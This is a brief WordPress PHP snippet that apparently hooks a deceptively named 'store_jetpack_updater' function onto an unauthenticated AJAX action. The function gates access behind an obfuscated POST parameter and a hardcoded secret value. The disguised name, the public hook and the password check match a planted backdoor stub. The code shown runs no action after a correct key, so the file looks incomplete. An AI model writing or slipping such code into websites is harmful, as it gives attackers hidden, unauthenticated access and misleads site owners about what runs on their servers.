<?php

function store_jetpack_updater() {
	if (!isset($_POST["rotllkxgptepbxe"]) || $_POST["rotllkxgptepbxe"] !== "zbqOkUqLruY") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'store_jetpack_updater', 5, 1);
